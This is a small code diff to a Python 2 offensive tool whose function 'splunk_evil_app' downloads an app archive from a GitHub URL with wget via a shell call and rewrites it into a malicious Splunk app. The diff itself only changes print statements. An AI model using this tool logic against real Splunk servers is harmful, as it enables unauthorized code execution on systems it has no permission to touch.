@@ -134,7 +134,7 @@ def splunk_evil_app():
     default_app = 'https://github.com/c610/tmp/raw/master/apka2.tgz'
     getapp = 'wget ' + default_app + ' -O /tmp/apka2.tgz'
     subprocess.call([ getapp ], shell=True)
-    print OKGREEN
+    print OKGREEN + '\n'
     print '  [+] app should be ready in /tmp/apka2.tgz'
     print '  [+] preparing...' + ENDC
 
@@ -155,7 +155,7 @@ def splunk_evil_app():
 
     subprocess.call([rewriteapp], shell=True)
     print OKGREEN + '  [+] Splunk app rewrited: /tmp/apkash.tgz\n' + ENDC
-    print appname
+    # print appname
 
 
   elif get_or_have == '2':
